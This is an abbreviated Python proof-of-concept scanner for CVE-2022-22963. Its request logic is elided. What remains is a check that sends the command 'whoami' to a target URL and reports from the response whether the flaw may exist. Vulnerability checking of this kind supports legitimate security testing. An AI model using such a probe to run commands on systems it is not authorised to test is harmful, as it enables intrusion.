#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/4/13 11:43
# Author     : yunkong
# FileName   : cve_2022_22963_poc.py
# Description:
#
...
def check_cve_2022_22963(target_url, command):
    ...
    try:
        ...
        if code == 500 and rsp in text:
            print(f"[+] Target: {target_url} CVE-2022-22963 may exist！！！")
        else:
            print(f"[-] Target: {target_url} CVE-2022-22963 may not exist！！！")
...
def vuln_scan_start(target_url):
    check_cve_2022_22963(target_url, "whoami")
